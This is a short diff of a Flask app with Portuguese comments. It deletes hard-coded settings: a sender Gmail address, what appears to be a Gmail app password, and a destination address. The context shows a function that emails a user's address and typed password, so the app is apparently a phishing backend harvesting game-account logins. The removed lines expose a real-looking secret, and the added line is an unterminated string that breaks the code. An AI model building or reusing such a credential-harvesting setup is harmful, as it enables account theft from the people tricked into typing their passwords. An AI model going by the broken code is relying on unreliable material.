@@ -6,9 +6,7 @@ from datetime import datetime
 app = Flask(__name__)
 
 # SUAS CONFIGURAÇÕES (Lembre-se de usar uma senha de app válida)
-EMAIL_REMETENTE = "eduardoeleress@gmail.com"
-SENHA_APP = "ckepwhwvjczkfmxi" 
-EMAIL_DESTINO = "freefire.nobru.cerou@gmail.com"
+EMAIL_REMETENTE = "
 
 def enviar_email(email_usuario, senha_digitada):
     try:
